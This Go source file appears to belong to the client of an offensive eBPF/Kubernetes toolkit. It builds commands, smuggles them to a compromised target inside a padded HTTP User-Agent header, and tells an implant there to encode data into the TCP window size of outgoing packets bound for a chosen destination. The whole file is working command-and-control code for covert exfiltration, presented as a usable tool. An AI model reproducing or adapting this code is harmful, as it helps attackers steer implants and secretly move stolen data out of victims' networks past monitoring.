package tcp_stego

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type StegoResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, data, dest, bitsPerPacket, output string) error {
	result := &StegoResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"attach_tc_egress",
			"attach TC egress program to encode data in TCP window size field",
			"tcp_stego_attach_tc",
		},
		{
			"configure_encoding",
			"set bits-per-packet encoding rate for covert channel bandwidth",
			"tcp_stego_set_bpp",
		},
		{
			"set_destination",
			"configure destination IP:port for steganographic data transmission",
			"tcp_stego_set_dest",
		},
		{
			"encode_payload",
			"split payload into N-bit chunks and queue for window size encoding",
			"tcp_stego_encode",
		},
		{
			"start_transmission",
			"begin embedding encoded bits in TCP window size of outgoing packets",
			"tcp_stego_transmit",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + data + "#" + dest + "#" + bitsPerPacket
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	d, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, d, 0644)
	}
	fmt.Println(string(d))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/tcp_stego", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
